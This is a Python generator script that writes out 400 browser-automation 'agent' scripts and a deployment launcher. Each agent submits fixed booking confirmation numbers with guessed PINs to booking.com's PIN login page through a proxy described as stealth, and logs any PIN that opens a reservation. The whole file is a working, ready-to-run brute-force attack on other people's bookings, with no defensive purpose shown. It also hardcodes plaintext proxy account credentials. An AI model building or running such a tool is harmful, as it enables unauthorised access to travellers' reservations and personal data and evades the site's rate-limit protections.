#!/usr/bin/env python3
"""
🚀 GHOSTFORM 400-AGENT ARMY GENERATOR 🚀
Creates 400 agents: 1A-1D, 2A-2D, ..., 100A-100D
Single command deployment for maximum warfare!
"""

import os
import json
import random
from datetime import datetime

# ARMY CONFIGURATION
TOTAL_UNITS = 100  # 1 to 100
SQUADS = ['A', 'B', 'C', 'D']  # 4 squads per unit
TOTAL_AGENTS = TOTAL_UNITS * len(SQUADS)  # 400 agents

# PROXY CONFIGURATION
PROXY_CONFIG = {
    "server": "https://us-pr.oxylabs.io:10000",
    "username": "customer-oxy1p_hnzsA",
    "password": "oxy1p_hnzsA1"
}

# BOOKING TARGETS - BATCH ASSIGNMENT STRATEGY
BOOKING_ASSIGNMENTS = {
    'A': "5830944764",  # Batch A: 1A-100A
    'B': "6160911170",  # Batch B: 1B-100B  
    'C': "6860261353",  # Batch C: 1C-100C
    'D': "6339614781"   # Batch D: 1D-100D
}

# SYNCHRONIZED PIN SETS - SAME PINS FOR ALL BATCHES
SYNCHRONIZED_PINS = [
    ["1759", "5585", "2390", "3008", "2963"],  # Cycle 1: Units 1-20
    ["4721", "8934", "1567", "9123", "3456"],  # Cycle 2: Units 21-40
    ["7890", "2345", "6789", "4567", "8901"],  # Cycle 3: Units 41-60
    ["3210", "7654", "9876", "5432", "1098"],  # Cycle 4: Units 61-80
    ["6543", "2109", "8765", "4321", "0987"]   # Cycle 5: Units 81-100
]

# PIN RANGES FOR SYNCHRONIZED DISTRIBUTION
def generate_synchronized_pin_sets():
    """Generate synchronized PIN sets according to Boss strategy"""
    pin_sets = []
    
    # Each unit (1-100) gets assigned to a cycle (1-5)
    for unit_num in range(1, TOTAL_UNITS + 1):
        # Determine which PIN cycle this unit belongs to
        cycle_index = (unit_num - 1) // 20  # 20 units per cycle
        if cycle_index >= len(SYNCHRONIZED_PINS):
            cycle_index = len(SYNCHRONIZED_PINS) - 1  # Use last cycle for overflow
        
        # All squads (A,B,C,D) in this unit get the same PIN set
        unit_pins = SYNCHRONIZED_PINS[cycle_index]
        pin_sets.append(unit_pins)
    
    return pin_sets

def create_agent_file(unit_num, squad, pin_list, agent_id):
    """Create individual agent file with Boss strategy"""
    
    # Get booking ID based on squad batch assignment
    booking_target = BOOKING_ASSIGNMENTS[squad]
    
    agent_code = f'''#!/usr/bin/env python3
"""
🎯 GHOSTFORM AGENT {unit_num}{squad}
Unit: {unit_num} | Squad: {squad} | Agent ID: {agent_id}
Target: {booking_target}
PINs: {', '.join(pin_list)}
"""

from playwright.sync_api import sync_playwright
import os
import time
import argparse

# --- Agent Configuration ---
AGENT_ID = "{unit_num}{squad}"
UNIT_NUM = {unit_num}
SQUAD = "{squad}"
CONFIRMATION = "{booking_target}"
PINS = {pin_list}
WAIT_TIME = 10
LOG_FILE = f"agent_{{AGENT_ID}}_log.txt"
SCREEN_DIR = f"screenshots_{{AGENT_ID}}"

# PROXY CONFIGURATION - STEALTH MODE
proxy_config = {{
    "server": "{PROXY_CONFIG['server']}",
    "username": "{PROXY_CONFIG['username']}",
    "password": "{PROXY_CONFIG['password']}"
}}

os.makedirs(SCREEN_DIR, exist_ok=True)

def log_result(pin, result, url):
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    with open(LOG_FILE, "a") as f:
        f.write(f"{{timestamp}},{{AGENT_ID}},{{CONFIRMATION}},{{pin}},{{result}},{{url}}\\n")
    print(f"📝 [{{AGENT_ID}}] {{timestamp}} - PIN {{pin}}: {{result}}")

def main():
    """Main agent execution"""
    print(f"""
🎯 GHOSTFORM AGENT {{AGENT_ID}} STARTING
Unit: {{UNIT_NUM}} | Squad: {{SQUAD}}
Target: {{CONFIRMATION}}
PINs: {{', '.join(PINS)}}
Proxy: {{proxy_config['server']}}
🚀 MISSION START!
""")
    
    success_count = 0
    fail_count = 0
    unknown_count = 0
    exception_count = 0

    with sync_playwright() as p:
        print(f"🚀 [{{AGENT_ID}}] Starting Playwright...")
        
        browser = p.chromium.launch(
            headless=False,
            proxy=proxy_config
        )
        print(f"🌐 [{{AGENT_ID}}] Browser launched with PROXY STEALTH!")
        page = browser.new_page()

        for pin in PINS:
            print(f"\\n🔁 [{{AGENT_ID}}] Testing PIN: {{pin}}")
            
            # LOGIC 1: Open browser and wait until completely loaded
            print(f"🌐 [{{AGENT_ID}}] Opening booking.com...")
            page.goto("https://secure.booking.com/help/confirmation_pin_auth")
            print(f"⏳ [{{AGENT_ID}}] Waiting for page to load completely...")
            page.wait_for_load_state("networkidle")
            print(f"✅ [{{AGENT_ID}}] Page loaded completely!")

            try:
                # LOGIC 2: Fill booking ID and PIN
                print(f"📝 [{{AGENT_ID}}] Looking for booking ID field...")
                page.wait_for_selector('input[placeholder="e.g. 1234567890"]')
                print(f"📝 [{{AGENT_ID}}] Filling booking ID: {{CONFIRMATION}}")
                page.fill('input[placeholder="e.g. 1234567890"]', CONFIRMATION)
                
                print(f"🔐 [{{AGENT_ID}}] Filling PIN: {{pin}}")
                page.fill('input[placeholder="e.g. 1234"]', pin)
                
                # Click Continue button
                print(f"🔍 [{{AGENT_ID}}] Looking for Continue button...")
                try:
                    page.wait_for_selector('button:has-text("Continue")')
                    print(f"✅ [{{AGENT_ID}}] Clicking Continue button...")
                    page.click('button:has-text("Continue")')
                except:
                    page.wait_for_selector('button[type="submit"]')
                    print(f"✅ [{{AGENT_ID}}] Clicking Submit button...")
                    page.click('button[type="submit"]')

                # LOGIC 3: Wait for results
                print(f"⏳ [{{AGENT_ID}}] Waiting for results...")
                time.sleep(5)
                
                # Wait for either success or error
                try:
                    page.wait_for_function(\"\"\"
                        () => {{
                            const urlChanged = window.location.href.includes('unique_order_id') || 
                                             window.location.href.includes('booking_details') ||
                                             window.location.href.includes('confirmation') ||
                                             window.location.href.includes('/help/reservation');
                            
                            const errorBanner = document.querySelector('.bui-alert--error') !== null ||
                                              document.querySelector('[class*="error"]') !== null ||
                                              document.querySelector('.alert-danger') !== null;
                            
                            return urlChanged || errorBanner;
                        }}
                    \"\"\", timeout=30000)
                except:
                    print(f"⚠️ [{{AGENT_ID}}] No clear result after 30s...")

                # Check results
                current_url = page.url
                print(f"🔍 [{{AGENT_ID}}] Current URL: {{current_url}}")
                
                error_elements = page.query_selector_all('.bui-alert--error, [class*="error"], .alert-danger')
                
                # Check for SUCCESS
                if ("unique_order_id" in current_url or 
                    "booking_details" in current_url or 
                    "/help/reservation" in current_url or
                    current_url != "https://secure.booking.com/help/confirmation_pin_auth"):
                    print(f"🎉 [{{AGENT_ID}}] SUCCESS! PIN {{pin}} is CORRECT!")
                    print(f"✅ [{{AGENT_ID}}] Success URL: {{current_url}}")
                    page.screenshot(path=f"{{SCREEN_DIR}}/{{CONFIRMATION}}_{{pin}}_SUCCESS.png")
                    log_result(pin, "SUCCESS", current_url)
                    success_count += 1
                    print(f"🎉 [{{AGENT_ID}}] MISSION ACCOMPLISHED! PIN FOUND!")
                    break  # Stop testing, mission complete!
                    
                # Check for FAILURE
                elif len(error_elements) > 0:
                    print(f"❌ [{{AGENT_ID}}] PIN {{pin}} is INCORRECT (error detected)")
                    page.screenshot(path=f"{{SCREEN_DIR}}/{{CONFIRMATION}}_{{pin}}_FAIL.png")
                    log_result(pin, "FAILURE", current_url)
                    fail_count += 1
                    
                else:
                    print(f"❓ [{{AGENT_ID}}] Unknown result for PIN {{pin}}")
                    page.screenshot(path=f"{{SCREEN_DIR}}/{{CONFIRMATION}}_{{pin}}_UNKNOWN.png")
                    log_result(pin, "UNKNOWN", current_url)
                    unknown_count += 1

            except Exception as e:
                print(f"💥 [{{AGENT_ID}}] Error testing PIN {{pin}}: {{e}}")
                page.screenshot(path=f"{{SCREEN_DIR}}/{{CONFIRMATION}}_{{pin}}_EXCEPTION.png")
                log_result(pin, "EXCEPTION", page.url)
                exception_count += 1

            # Pause before next PIN
            if len(PINS) > 1:
                print(f"⏳ [{{AGENT_ID}}] Waiting {{WAIT_TIME}}s before next PIN...")
                time.sleep(WAIT_TIME)

        browser.close()

    # Final report
    print(f"""
🎯 [{{AGENT_ID}}] MISSION COMPLETE!
📊 Results Summary:
   Success: {{success_count}}
   Failure: {{fail_count}}
   Unknown: {{unknown_count}}
   Exception: {{exception_count}}
""")

if __name__ == "__main__":
    main()
'''
    
    filename = f"agent_{unit_num:03d}{squad}.py"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(agent_code)
    
    print(f"✅ Created: {filename}")
    return filename

def create_deployment_commander():
    """Create the master deployment script"""
    
    commander_code = f'''#!/usr/bin/env python3
"""
🚀 GHOSTFORM 400-AGENT DEPLOYMENT COMMANDER 🚀
Deploys all 400 agents in sequence: 1A→1B→1C→1D→2A→...→100D
"""

import subprocess
import time
import os
from datetime import datetime

# DEPLOYMENT CONFIGURATION
TOTAL_UNITS = {TOTAL_UNITS}
SQUADS = {SQUADS}
DEPLOYMENT_DELAY = 30  # seconds between agent deployments
LOG_FILE = "deployment_log.txt"

def log_deployment(agent_id, status, details=""):
    """Log deployment status"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{{timestamp}},{{agent_id}},{{status}},{{details}}\\n")
    print(f"📝 [{{timestamp}}] {{agent_id}}: {{status}} {{details}}")

def deploy_agent(unit_num, squad):
    """Deploy individual agent"""
    agent_id = f"{{unit_num:03d}}{{squad}}"
    filename = f"agent_{{agent_id}}.py"
    
    if not os.path.exists(filename):
        log_deployment(agent_id, "ERROR", f"File {{filename}} not found")
        return False
    
    try:
        print(f"\\n🚀 DEPLOYING AGENT {{agent_id}}...")
        log_deployment(agent_id, "DEPLOYING", "Starting agent execution")
        
        # Execute agent in background
        process = subprocess.Popen(
            ["python", filename],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Wait for completion or timeout
        try:
            stdout, stderr = process.communicate(timeout=300)  # 5 minute timeout per agent
            
            if process.returncode == 0:
                log_deployment(agent_id, "SUCCESS", "Agent completed successfully")
                return True
            else:
                log_deployment(agent_id, "FAILED", f"Return code: {{process.returncode}}")
                return False
                
        except subprocess.TimeoutExpired:
            process.kill()
            log_deployment(agent_id, "TIMEOUT", "Agent execution timed out")
            return False
            
    except Exception as e:
        log_deployment(agent_id, "EXCEPTION", str(e))
        return False

def main():
    """Main deployment commander"""
    print(f\"\"\"
🚀 GHOSTFORM 400-AGENT DEPLOYMENT COMMANDER 🚀
Total Units: {{TOTAL_UNITS}}
Squads per Unit: {{len(SQUADS)}}
Total Agents: {{TOTAL_UNITS * len(SQUADS)}}
Deployment Order: Sequential (1A→1B→1C→1D→2A→...)
Delay Between Agents: {{DEPLOYMENT_DELAY}}s
🎯 BEGINNING MASS DEPLOYMENT!
\"\"\")
    
    start_time = datetime.now()
    deployed = 0
    successful = 0
    failed = 0
    
    # Deploy all agents sequentially
    for unit_num in range(1, TOTAL_UNITS + 1):
        for squad in SQUADS:
            agent_id = f"{{unit_num:03d}}{{squad}}"
            print(f"\\n🎯 [{{deployed + 1}}/{{TOTAL_UNITS * len(SQUADS)}}] Deploying Agent {{agent_id}}...")
            
            if deploy_agent(unit_num, squad):
                successful += 1
            else:
                failed += 1
            
            deployed += 1
            
            # Delay before next agent (except last)
            if deployed < TOTAL_UNITS * len(SQUADS):
                print(f"⏳ Waiting {{DEPLOYMENT_DELAY}}s before next agent...")
                time.sleep(DEPLOYMENT_DELAY)
    
    # Final report
    end_time = datetime.now()
    duration = end_time - start_time
    
    print(f\"\"\"
🎉 DEPLOYMENT COMPLETE!
📊 Final Statistics:
   Total Deployed: {{deployed}}
   Successful: {{successful}}
   Failed: {{failed}}
   Duration: {{duration}}
   Start Time: {{start_time.strftime('%Y-%m-%d %H:%M:%S')}}
   End Time: {{end_time.strftime('%Y-%m-%d %H:%M:%S')}}
🏆 400-AGENT ARMY DEPLOYMENT FINISHED!
\"\"\")

if __name__ == "__main__":
    main()
'''
    
    with open("deploy_400_army.py", 'w', encoding='utf-8') as f:
        f.write(commander_code)
    
    print("✅ Created: deploy_400_army.py")

def main():
    """Main army generator"""
    print(f"""
🚀 GHOSTFORM 400-AGENT ARMY GENERATOR 🚀
Creating {TOTAL_AGENTS} agents: {TOTAL_UNITS} units × {len(SQUADS)} squads
Strategy: Boss Synchronized Batch Rotation
Batch A: {BOOKING_ASSIGNMENTS['A']} | Batch B: {BOOKING_ASSIGNMENTS['B']}
Batch C: {BOOKING_ASSIGNMENTS['C']} | Batch D: {BOOKING_ASSIGNMENTS['D']}
Proxy: {PROXY_CONFIG['server']}
🎯 BEGINNING STRATEGIC ARMY CREATION!
""")
    
    # Generate synchronized PIN sets for all units
    print("🎲 Generating synchronized PIN distributions...")
    unit_pin_sets = generate_synchronized_pin_sets()
    
    # Create army manifest
    army_manifest = {
        "creation_time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "total_agents": TOTAL_AGENTS,
        "units": TOTAL_UNITS,
        "squads": SQUADS,
        "proxy_config": PROXY_CONFIG,
        "booking_assignments": BOOKING_ASSIGNMENTS,
        "synchronized_pins": SYNCHRONIZED_PINS,
        "agents": []
    }
    
    # Create all agent files
    created_files = []
    
    for unit_num in range(1, TOTAL_UNITS + 1):
        # Get PIN set for this unit (same across all squads)
        unit_index = unit_num - 1
        unit_pins = unit_pin_sets[unit_index] if unit_index < len(unit_pin_sets) else unit_pin_sets[-1]
        
        for squad in SQUADS:
            agent_id = (unit_num - 1) * len(SQUADS) + SQUADS.index(squad)
            print(f"🔧 Creating Agent {unit_num:03d}{squad} (Unit {unit_num}, Squad {squad})...")
            
            filename = create_agent_file(unit_num, squad, unit_pins, agent_id)
            created_files.append(filename)
            
            # Add to manifest
            army_manifest["agents"].append({
                "unit": unit_num,
                "squad": squad,
                "agent_id": f"{unit_num:03d}{squad}",
                "filename": filename,
                "pins": unit_pins,
                "booking_target": BOOKING_ASSIGNMENTS[squad]
            })
    
    # Save army manifest
    with open("army_manifest_400.json", 'w', encoding='utf-8') as f:
        json.dump(army_manifest, f, indent=2)
    
    # Create deployment commander
    print("🎖️ Creating deployment commander...")
    create_deployment_commander()
    
    # Final report
    print(f"""
🎉 400-AGENT ARMY CREATION COMPLETE!
📂 Files Created: {len(created_files)} agent files
📋 Manifest: army_manifest_400.json
🚀 Deployment Script: deploy_400_army.py

🎯 READY FOR BATTLE! Run this command to deploy:
   python deploy_400_army.py

🏆 GHOSTFORM 400-AGENT ARMY READY FOR DEPLOYMENT!
""")

if __name__ == "__main__":
    main()
